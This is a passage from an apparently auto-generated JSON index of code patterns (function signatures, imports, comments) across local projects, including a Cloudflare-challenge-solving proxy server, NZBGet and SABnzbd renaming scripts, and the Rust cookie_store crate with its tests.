        "docstrings": [],
        "function_defs": [
          "def __init__(self, solver_url):",
          "def http_client(self) -> httpx.AsyncClient:"
        ],
        "class_defs": [
          "class AsyncClient(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import typing",
          "import copy",
          "import json",
          "import re",
          "import httpx"
        ],
        "comments": [
          "# < base user-agent that will be used before first challenge solve,",
          "# after it will be replaced with solver actual user-agent",
          "# request web page",
          "# check that it is cloud flare block",
          "# Return site original 403(non cloud flare blocking) as is - application should process it.",
          "# c is http.cookiejar.Cookie",
          "# < use for solve original client cookies,",
          "# it can contains some required information other that cloud flare marker.",
          "# Update _http_client cookies"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": [
          "@property"
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/src/flare_bypasser/flare_bypass_server.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, app):",
          "def parse_class_command_processors(custom_command_processors_str: str):",
          "def parse_entrypoint_command_processors(extension: str):",
          "def parse_solve_forks(solve_forks: str):",
          "def init_args_parser():",
          "def init_extensions(args):",
          "def server_run():"
        ],
        "class_defs": [
          "class RemoveContentTypeRequirementMiddleware(object):",
          "class ProxyModel(pydantic.BaseModel):",
          "class CookieModel(pydantic.BaseModel):",
          "class DefferedForksModel(pydantic.BaseModel):",
          "class HandleCommandResponseSolution(pydantic.BaseModel):",
          "class HandleCommandResponse(pydantic.BaseModel):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import re",
          "import typing",
          "import typing_extensions",
          "import datetime",
          "import copy",
          "import platform",
          "import uuid",
          "import pathlib",
          "import asyncio",
          "import traceback",
          "import importlib",
          "import logging",
          "import argparse",
          "import urllib3.util",
          "import fastapi",
          "import pydantic",
          "import flare_bypasser",
          "import gunicorn.app.wsgiapp",
          "import uvicorn.main"
        ],
        "comments": [
          "# Remove requirement for Content-Type header presence.",
          "# Unexpected headers format - don't make something.",
          "# Adapt proxy format for canonical representation.",
          "# < solve_response can't be None if no return_condition passed to wait_first_non_exception,",
          "# only exception expected",
          "# < pass cookies as dict's (solver don't know about rest model).",
          "# Endpoint compatible with flaresolverr API.",
          "# REST API concept methods.",
          "# postDataContentType: typing_extensions.Annotated[",
          "#   str,",
          "#   fastapi.Body(description=\"Content-Type that will be sent.\")",
          "#   ]='',",
          "# 'postDataContentType': postDataContentType,",
          "# < parse for pass to gunicorn as is and as \"--host X --port X\" to uvicorn",
          "# FLARE_BYPASS_COMMANDPROCESSORS format: <command>:<module>.<class>",
          "# class should have default constructor (without parameters)",
          "# Expect that extension element has format: <module>.<method>",
          "# Init ProxyController"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 22,
        "decorators": [
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post("
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/src/flare_bypasser/proxy_controller.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, proxy_storage: object, local_port: int, url: str):",
          "def add_ref(self):",
          "def remove_ref(self):",
          "def __init__(self, proxy_holder: object):",
          "def local_port(self):",
          "def url(self):",
          "def is_alive(self):",
          "def release(self):",
          "def __enter__(self):",
          "def __exit__(self, type, value, traceback):",
          "def __del__(self):",
          "def __init__(",
          "def get_proxy(self, url):",
          "def opened_proxies_count(self):",
          "def _port_is_listen(port):",
          "def _choose_port(self, url):",
          "def _start_proxy(self, proxy_holder):",
          "def _close_proxy(self, proxy_holder):"
        ],
        "class_defs": [
          "class ProxyController(object):",
          "class PortBusy(Exception):",
          "class NoPortForListen(Exception):",
          "class ProxyHolder(object):",
          "class ProxyHolderRef(object):"
        ],
        "imports": [
          "import typing",
          "import threading",
          "import subprocess",
          "import socket",
          "import logging",
          "import contextlib",
          "import oslex",
          "import jinja2"
        ],
        "comments": [
          "# [start_port .. end_port]: localy started proxies will use ports in this interval",
          "# wait start if it in progress",
          "# < Start/wait start or simple increase ref.",
          "# Start proxy process",
          "# Close proxy process"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": [
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/examples/custom_user_commands/CustomUserCommands.py",
        "docstrings": [],
        "function_defs": [
          "def get_user_commands():"
        ],
        "class_defs": [
          "class MyClickCommandProcessor(BaseCommandProcessor):"
        ],
        "imports": [
          "import zendriver_flare_bypasser as zendriver",
          "from flare_bypasser import BaseCommandProcessor, Request, Response, BrowserWrapper"
        ],
        "comments": [
          "# Here we can check some required parameters in req.params and raise error.",
          "# Expect here \"Bledny kod\" text in DOM (appears only after click)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/examples/async_client/async_client_example.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "import argparse",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/tests/unit_tests/proxy_controller_test.py",
        "docstrings": [],
        "function_defs": [
          "def test_two_different_proxies_rent():",
          "def test_two_equal_proxies_rent():"
        ],
        "class_defs": [],
        "imports": [
          "from flare_bypasser import ProxyController"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/config/recyclarr/repositories/trash-guides/docs/Downloaders/NZBGet/scripts/Clean/Clean.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from __future__ import print_function",
          "import os, re, sys"
        ],
        "comments": [
          "##############################################################################",
          "### NZBGET SCAN SCRIPT                                                     ###",
          "# Clean NZB name.",
          "#",
          "# Removes the following suffixes from NZB name:",
          "# NZBgeek / Obfuscated / BUYMORE / Scrambled.",
          "#",
          "# NOTE: This script requires Python to be installed on your system.",
          "### NZBGET SCAN SCRIPT                                                     ###",
          "##############################################################################",
          "# Exit codes used by NZBGet",
          "# Check if the script is called from NZBGet 13.0 or later"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/config/recyclarr/repositories/trash-guides/docs/Downloaders/NZBGet/scripts/replace_for/replace_for.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from __future__ import print_function",
          "import os, re, sys"
        ],
        "comments": [
          "#",
          "##############################################################################",
          "### NZBGET POST-PROCESSING SCRIPT                                          ###",
          "# Replace underscore with dot.",
          "#",
          "# Author: miker",
          "#",
          "#",
          "# Copy script to NZBGet's script folder.",
          "# Run sudo chmod +x replace_for.py",
          "#",
          "#",
          "# NOTE: This script requires Python to be installed on your system.",
          "### NZBGET POST-PROCESSING SCRIPT                                          ###",
          "##############################################################################",
          "# Exit codes used by NZBGet"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/config/recyclarr/repositories/trash-guides/docs/Downloaders/SABnzbd/scripts/Clean/Clean.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "import re"
        ],
        "comments": [
          "##################################################################",
          "### SABnzbd - Clean NZB Renamer                                 ##",
          "##################################################################",
          "##                                                              ##",
          "## Removes the suffixes from NZB name used by bots:             ##",
          "## examples: NZBgeek / Obfuscated / BUYMORE / Scrambled, etc..  ##",
          "##                                                              ##",
          "## NOTE: This script requires Python 3                          ##",
          "##                                                              ##",
          "## Install:                                                     ##",
          "## 1. Copy script to SABnzbd's script folder                    ##",
          "## 2. run: sudo chmod +x Clean.py                               ##",
          "## 3. in SABnzbd go to Config > Switches                        ##",
          "## 4. Change Pre-queue user script and select: Clean.py         ##",
          "##################################################################",
          "# normalize argv to scriptname and just first 8 arguments to maintain compatibility",
          "# Parse the input variables for SABnzbd version >= 4.2.0",
          "# 0 means OK"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/config/recyclarr/repositories/trash-guides/docs/Downloaders/SABnzbd/scripts/replace_for/replace_for.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "import os",
          "import os.path"
        ],
        "comments": [
          "##################################################################",
          "### SABnzbd - Replace underscores with dots                     ##",
          "##################################################################",
          "##                                                              ##",
          "## NOTE: This script requires Python 3                          ##",
          "##                                                              ##",
          "## Author: miker                                                ##",
          "##                                                              ##",
          "## Install:                                                     ##",
          "## 1. Copy script to SABnzbd's script folder                    ##",
          "## 2. run: sudo chmod +x replace_for.py                         ##",
          "## 3. in SABnzbd go to Config > Categories                      ##",
          "## 4. Assign replace_for.py to the required category            ##",
          "##################################################################",
          "# 0 means OK"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/numpy/typing",
    "name": "typing",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv/lib/python3.11/site-packages/numpy/typing",
    "name": "typing",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie_store-0.20.0",
    "name": "cookie_store-0.20.0",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie_store-0.20.0/src/cookie_store.rs",
        "function_defs": [
          "fn get_mut(&mut self, domain: &str, path: &str, name: &str) -> Option<&mut Cookie<'static>> {",
          "fn get_mut_any(",
          "fn map_remove<K, V, Q>(map: &mut Map<K, V>, key: &Q) -> Option<V>",
          "fn map_remove<K, V, Q>(map: &mut Map<K, V>, key: &Q) -> Option<V>",
          "fn load_from<R, E, F>(",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn expecting(&self, formatter: &mut Formatter<'_>) -> fmt::Result {",
          "fn visit_seq<A>(self, mut seq: A) -> Result<Self::Value, A::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn add_cookie(",
          "fn make_match_store() -> CookieStore {",
          "fn insert_raw() {",
          "fn parse() {",
          "fn save() {",
          "fn serialize() {",
          "fn domains() {",
          "fn domain_cookie_from(domain: &str, request_url: &str) -> Cookie<'static> {",
          "fn http_only() {",
          "fn load() {",
          "fn deserialize() {",
          "fn clear() {",
          "fn add_and_get() {",
          "fn matches() {",
          "fn expiry() {",
          "fn non_persistent() {",
          "fn matches_are(store: &CookieStore, url: &str, exp: Vec<&str>) {",
          "fn some_non_https_uris_are_secure() {",
          "fn domain_collisions() {",
          "fn path_collisions() {"
        ],
        "struct_defs": [
          "struct CookieStoreVisitor;"
        ],
        "impl_blocks": [
          "impl CookieStore {",
          "impl Serialize for CookieStore {"
        ],
        "uses": [
          "use std::fmt::{self, Formatter};",
          "use std::io::{BufRead, Write};",
          "use std::iter;",
          "use std::ops::Deref;",
          "use cookie::Cookie as RawCookie;",
          "use log::debug;",
          "use serde::de::{SeqAccess, Visitor};",
          "use serde::{Deserialize, Deserializer, Serialize, Serializer};",
          "use url::Url;",
          "use crate::cookie::Cookie;",
          "use crate::cookie_domain::is_match as domain_match;",
          "use crate::cookie_path::is_match as path_match;",
          "use crate::utils::{is_http_scheme, is_secure};",
          "use crate::CookieError;",
          "use indexmap::IndexMap;",
          "use std::collections::HashMap;",
          "use super::CookieStore;",
          "use super::{InsertResult, StoreAction};",
          "use crate::cookie::Cookie;",
          "use crate::CookieError;",
          "use ::cookie::Cookie as RawCookie;",
          "use std::str::from_utf8;",
          "use time::OffsetDateTime;",
          "use crate::utils::test as test_utils;",
          "use serde_json;"
        ],
        "macros": [
          "if cookie.secure() != Some(true) || cfg!(feature = \"log_secure_cookie_values\") {",
          "debug!(\"inserting Set-Cookie '{:?}'\", cookie);",
          "debug!(\"inserting secure cookie '{}'\", cookie.name());",
          "debug!(\"unable to store Set-Cookie: {:?}\", e);",
          "writeln!(writer, \"{}\", cookie?)?;",
          "writeln!(writer, \"{}\", cookie_to_string(cookie)?)?;",
          "write!(formatter, \"a sequence of cookies\")",
          "assert!(val.contains($e), \"exp: {}\\nval: {}\", $e, val);",
          "assert!(!val.contains($e), \"exp: {}\\nval: {}\", $e, val);",
          "assert_eq!(Ok(StoreAction::Inserted), $e)",
          "assert_eq!(Ok(StoreAction::UpdatedExisting), $e)",
          "assert_eq!(Ok(StoreAction::ExpiredExisting), $e)",
          "assert_eq!(Err(CookieError::DomainMismatch), $e)",
          "assert_eq!(Err(CookieError::NonHttpScheme), $e)",
          "assert_eq!(Err(CookieError::NonRelativeScheme), $e)",
          "assert_eq!(Err(CookieError::Expired), $e)",
          "assert!(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "values_are!($store, \"http://unknowndomain.org/foo/bar\", vec![]);",
          "values_are!($store, \"http://example.org/foo/bar\", vec![\"8\"]);",
          "values_are!($store, \"http://example.org/bus/bar\", vec![]);",
          "values_are!($store, \"http://bar.example.org/foo/bar\", vec![\"9\"]);",
          "values_are!($store, \"http://bar.example.org/bus/bar\", vec![]);",
          "values_are!(",
          "values_are!($store, \"http://example.com/sec/foo\", vec![\"6\", \"3\"]);",
          "values_are!($store, \"ftp://example.com/sec/foo\", vec![\"6\"]);",
          "values_are!($store, \"http://bar.example.com/foo/bar/bus\", vec![\"7\"]);",
          "values_are!(",
          "inserted!(store.insert_raw(",
          "non_rel_scheme!(store.insert_raw(",
          "non_http_scheme!(store.insert_raw(",
          "expired_existing!(store.insert_raw(",
          "expired_err!(store.insert_raw(",
          "updated!(store.insert_raw(",
          "expired_existing!(store.insert_raw(",
          "domain_mismatch!(store.insert_raw(",
          "inserted!(store.parse(",
          "non_rel_scheme!(store.parse(\"cookie1=value1\", &test_utils::url(\"data:nonrelative",
          "non_http_scheme!(store.parse(",
          "expired_existing!(store.parse(",
          "expired_err!(store.parse(",
          "updated!(store.parse(",
          "expired_existing!(store.parse(",
          "domain_mismatch!(store.parse(",
          "assert_eq!(\"\", from_utf8(&output[..]).unwrap());",
          "inserted!(add_cookie(",
          "assert_eq!(\"\", from_utf8(&output[..]).unwrap());",
          "inserted!(add_cookie(",
          "not_has_str!(\"cookie0=value0\", output);",
          "has_str!(\"cookie1=value1\", output);",
          "inserted!(add_cookie(",
          "not_has_str!(\"cookie0=value0\", output);",
          "has_str!(\"cookie1=value1\", output);",
          "has_str!(\"cookie2=value2\", output);",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "not_has_str!(\"cookie0=value0\", output);",
          "has_str!(\"cookie1=value1\", output);",
          "has_str!(\"cookie2=value2\", output);",
          "has_str!(\"cookie3=value3\", output);",
          "has_str!(\"cookie4=value4\", output);",
          "has_str!(\"cookie5=value5\", output);",
          "has_str!(\"cookie6=value6\", output);",
          "has_str!(\"cookie7=value7; Secure\", output);",
          "has_str!(\"cookie8=value8; HttpOnly\", output);",
          "assert_eq!(\"[]\", from_utf8(&output[..]).unwrap());",
          "inserted!(add_cookie(",
          "assert_eq!(\"[]\", from_utf8(&output[..]).unwrap());",
          "inserted!(add_cookie(",
          "not_has_str!(\"cookie0=value0\", output);",
          "has_str!(\"cookie1=value1\", output);",
          "inserted!(add_cookie(",
          "not_has_str!(\"cookie0=value0\", output);",
          "has_str!(\"cookie1=value1\", output);",
          "has_str!(\"cookie2=value2\", output);",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "not_has_str!(\"cookie0=value0\", output);",
          "has_str!(\"cookie1=value1\", output);",
          "has_str!(\"cookie2=value2\", output);",
          "has_str!(\"cookie3=value3\", output);",
          "has_str!(\"cookie4=value4\", output);",
          "has_str!(\"cookie5=value5\", output);",
          "has_str!(\"cookie6=value6\", output);",
          "has_str!(\"cookie7=value7; Secure\", output);",
          "has_str!(\"cookie8=value8; HttpOnly\", output);",
          "let cookie_str = format!(\"cookie1=value1; Domain={}\", domain);",
          "inserted!(store.insert(",
          "updated!(store.insert(",
          "inserted!(store.insert(",
          "updated!(store.insert(",
          "domain_mismatch!(store.insert(",
          "domain_mismatch!(store.insert(",
          "domain_mismatch!(store.insert(",
          "domain_mismatch!(store.insert(",
          "updated!(store.insert(",
          "updated!(store.insert(",
          "inserted!(store.insert(",
          "updated!(store.insert(",
          "domain_mismatch!(store.insert(",
          "domain_mismatch!(store.insert(",
          "updated!(store.insert(",
          "updated!(store.insert(",
          "domain_mismatch!(store.insert(",
          "domain_mismatch!(store.insert(",
          "domain_mismatch!(store.insert(",
          "domain_mismatch!(store.insert(",
          "non_http_scheme!(store.insert(c, &test_utils::url(\"ftp://example.com/foo/bar\"),)",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "not_has_str!(\"cookie0=value0\", output);",
          "has_str!(\"cookie1=value1\", output);",
          "has_str!(\"cookie2=value2\", output);",
          "has_str!(\"cookie3=value3\", output);",
          "has_str!(\"cookie4=value4\", output);",
          "has_str!(\"cookie5=value5\", output);",
          "has_str!(\"cookie6=value6\", output);",
          "has_str!(\"cookie7=value7; Secure\", output);",
          "has_str!(\"cookie8=value8; HttpOnly\", output);",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie0\").is_none());",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie1\").unwrap().value() == \"value1\"",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie2\").unwrap().value() == \"value2\"",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie3\").unwrap().value() == \"value3\"",
          "assert!(",
          "assert!(store.get(\"127.0.0.1\", \"/foo\", \"cookie5\").unwrap().value() == \"value5\");",
          "assert!(store.get(\"[::1]\", \"/foo\", \"cookie6\").unwrap().value() == \"value6\");",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie7\").unwrap().value() == \"value7\"",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie8\").unwrap().value() == \"value8\"",
          "check_matches!(&store);",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "not_has_str!(\"cookie0=value0\", output);",
          "has_str!(\"cookie1=value1\", output);",
          "has_str!(\"cookie2=value2\", output);",
          "has_str!(\"cookie3=value3\", output);",
          "has_str!(\"cookie4=value4\", output);",
          "has_str!(\"cookie5=value5\", output);",
          "has_str!(\"cookie6=value6\", output);",
          "has_str!(\"cookie7=value7; Secure\", output);",
          "has_str!(\"cookie8=value8; HttpOnly\", output);",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie0\").is_none());",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie1\").unwrap().value() == \"value1\"",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie2\").unwrap().value() == \"value2\"",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie3\").unwrap().value() == \"value3\"",
          "assert!(",
          "assert!(store.get(\"127.0.0.1\", \"/foo\", \"cookie5\").unwrap().value() == \"value5\");",
          "assert!(store.get(\"[::1]\", \"/foo\", \"cookie6\").unwrap().value() == \"value6\");",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie7\").unwrap().value() == \"value7\"",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie8\").unwrap().value() == \"value8\"",
          "check_matches!(&store);",
          "inserted!(add_cookie(",
          "has_str!(\"cookie1=value1\", output);",
          "assert_eq!(\"\", from_utf8(&output[..]).unwrap());",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie1\").is_none());",
          "inserted!(add_cookie(",
          "assert!(store.get(\"example.com\", \"/foo/bar\", \"cookie1\").is_none());",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie2\").is_none());",
          "assert!(store.get(\"example.org\", \"/foo\", \"cookie1\").is_none());",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie1\").unwrap().value() == \"value1\"",
          "updated!(add_cookie(",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie1\").unwrap().value() == \"value2\"",
          "inserted!(add_cookie(",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie1\").unwrap().value() == \"value2\"",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie2\").unwrap().value() == \"value3\"",
          "inserted!(add_cookie(",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie1\").unwrap().value() == \"value2\"",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie2\").unwrap().value() == \"value3\"",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie3\").unwrap().value() == \"value4\"",
          "non_http_scheme!(add_cookie(",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie1\").unwrap().value() == \"value2\"",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie2\").unwrap().value() == \"value3\"",
          "assert!(store.get(\"example.com\", \"/foo\", \"cookie3\").unwrap().value() == \"value4\"",
          "check_matches!(&store);",
          "expired_err!(store.insert(expired_cookie, &request_url));",
          "check_matches!(&store);",
          "None => unreachable!(),",
          "values_are!(store, \"http://unknowndomain.org/foo/bar\", vec![]);",
          "values_are!(store, \"http://example.org/foo/bar\", vec![\"8\"]);",
          "values_are!(store, \"http://example.org/bus/bar\", vec![]);",
          "values_are!(store, \"http://bar.example.org/foo/bar\", vec![\"9\"]);",
          "values_are!(store, \"http://bar.example.org/bus/bar\", vec![]);",
          "values_are!(store, \"https://example.com/sec/foo\", vec![\"4\", \"3\", \"2\"]);",
          "values_are!(store, \"http://example.com/sec/foo\", vec![\"3\"]);",
          "values_are!(store, \"ftp://example.com/sec/foo\", vec![]);",
          "values_are!(store, \"http://bar.example.com/foo/bar/bus\", vec![\"7\"]);",
          "values_are!(store, \"http://example.com/foo/bar/bus\", vec![\"1\", \"5\"]);",
          "Some(cookie) => assert!(cookie.is_expired()),",
          "None => unreachable!(),",
          "expired_existing!(store.insert(expired_cookie, &request_url));",
          "values_are!(store, \"http://unknowndomain.org/foo/bar\", vec![]);",
          "values_are!(store, \"http://example.org/foo/bar\", vec![\"8\"]);",
          "values_are!(store, \"http://example.org/bus/bar\", vec![]);",
          "values_are!(store, \"http://bar.example.org/foo/bar\", vec![\"9\"]);",
          "values_are!(store, \"http://bar.example.org/bus/bar\", vec![]);",
          "values_are!(store, \"https://example.com/sec/foo\", vec![\"4\", \"3\", \"2\"]);",
          "values_are!(store, \"http://example.com/sec/foo\", vec![\"3\"]);",
          "values_are!(store, \"ftp://example.com/sec/foo\", vec![]);",
          "values_are!(store, \"http://bar.example.com/foo/bar/bus\", vec![\"7\"]);",
          "values_are!(store, \"http://example.com/foo/bar/bus\", vec![\"1\"]);",
          "Some(cookie) => assert!(cookie.is_expired()),",
          "None => unreachable!(),",
          "values_are!(store, \"http://unknowndomain.org/foo/bar\", vec![]);",
          "values_are!(store, \"http://example.org/foo/bar\", vec![\"8\"]);",
          "values_are!(store, \"http://example.org/bus/bar\", vec![]);",
          "values_are!(store, \"http://bar.example.org/foo/bar\", vec![\"9\"]);",
          "values_are!(store, \"http://bar.example.org/bus/bar\", vec![]);",
          "values_are!(store, \"https://example.com/sec/foo\", vec![\"4\", \"3\", \"2\"]);",
          "values_are!(store, \"http://example.com/sec/foo\", vec![\"3\"]);",
          "values_are!(store, \"ftp://example.com/sec/foo\", vec![]);",
          "values_are!(store, \"http://bar.example.com/foo/bar/bus\", vec![\"7\"]);",
          "values_are!(store, \"http://example.com/foo/bar/bus\", vec![\"1\"]);",
          "assert!(store.get_any(\"example.com\", \"/\", \"cookie6\").is_none());",
          "assert!(store.get_any(\"example.com\", \"/foo\", \"cookie5\").is_none());",
          "check_matches!(&store);",
          "inserted!(store.insert(non_persistent, &request_url));",
          "None => unreachable!(),",
          "Some(cookie) => assert_eq!(\"value10\", cookie.value()),",
          "check_matches!(&store);",
          "assert!(store.get(\"example.com\", \"/tmp\", \"cookie10\").is_none());",
          "assert!(store.get_any(\"example.com\", \"/tmp\", \"cookie10\").is_none());",
          "println!(\"\");",
          "println!(",
          "println!(",
          "println!(\"----------------\");",
          "println!(\"================\");",
          ".map(|c| format!(\"{}={}\", c.name(), c.value()))",
          "assert!(",
          "assert!(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "dump!(\"domain_collisions\", store);",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "inserted!(add_cookie(",
          "dump!(\"path_collisions\", store);"
        ],
        "derives": [
          "#[derive(PartialEq, Clone, Debug, Eq)]",
          "#[derive(Debug, Default, Clone)]"
        ],
        "error_handling": 98
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie_store-0.20.0/src/lib.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {",
          "fn from(e: idna::Errors) -> Self {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl std::fmt::Display for IdnaErrors {",
          "impl std::error::Error for IdnaErrors {}",
          "impl From<idna::Errors> for IdnaErrors {"
        ],
        "uses": [
          "use idna;",
          "use serde::ser::Error;",
          "use serde::{de::Error, Deserialize};"
        ],
        "macros": [
          "write!(f, \"IDNA errors: {:#?}\", self.0)",
          "time::macros::format_description!(\"[year]-[month]-[day]T[hour]:[minute]:[second]",
          "println!(\"{}\", e);",
          "S::Error::custom(format!(",
          "D::Error::custom(format!("
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie_store-0.20.0/src/cookie_expiration.rs",
        "function_defs": [
          "fn eq(&self, other: &Self) -> bool {",
          "fn from(max_age: u64) -> CookieExpiration {",
          "fn from(utc_tm: OffsetDateTime) -> CookieExpiration {",
          "fn from(expiration: cookie::Expiration) -> CookieExpiration {",
          "fn from(duration: time::Duration) -> Self {",
          "fn max_age_bounds() {",
          "fn expired() {",
          "fn max_age() {",
          "fn session_end() {",
          "fn at_utc() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl std::cmp::PartialEq for CookieExpiration {",
          "impl CookieExpiration {",
          "impl From<u64> for CookieExpiration {",
          "impl From<time::OffsetDateTime> for CookieExpiration {",
          "impl From<cookie::Expiration> for CookieExpiration {",
          "impl From<time::Duration> for CookieExpiration {"
        ],
        "uses": [
          "use std;",
          "use serde_derive::{Deserialize, Serialize};",
          "use time::{self, OffsetDateTime};",
          "use super::CookieExpiration;",
          "use time;",
          "use crate::utils::test::*;"
        ],
        "macros": [
          "const MAX_RFC3339: time::OffsetDateTime = time::macros::date!(9999 - 12 - 31)",
          ".with_time(time::macros::time!(23:59:59))",
          "CookieExpiration::AtUtc(_) => assert!(true),",
          "_ => assert!(false),",
          "assert!(ma.is_expired());",
          "assert!(ma.expires_by(&in_days(-1)));",
          "assert!(!ma.is_expired());",
          "assert!(ma.expires_by(&in_minutes(2)));",
          "assert!(!se.is_expired());",
          "assert!(!se.expires_by(&in_days(1)));",
          "assert!(!se.expires_by(&in_days(-1)));",
          "assert!(!expire_tmrw.is_expired());",
          "assert!(expire_tmrw.expires_by(&in_days(2)));",
          "assert!(expired_yest.is_expired());",
          "assert!(!expired_yest.expires_by(&in_days(-2)));"
        ],
        "derives": [
          "#[derive(Eq, Clone, Debug, Serialize, Deserialize)]"
        ],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie_store-0.20.0/src/cookie_path.rs",
        "function_defs": [
          "fn as_ref(&self) -> &str {",
          "fn deref(&self) -> &Self::Target {",
          "fn from(cp: &CookiePath) -> String {",
          "fn from(cp: CookiePath) -> String {",
          "fn default_path() {",
          "fn get_path(url: &str) -> String {",
          "fn do_match(exp: bool, cp: &str, rp: &str) {",
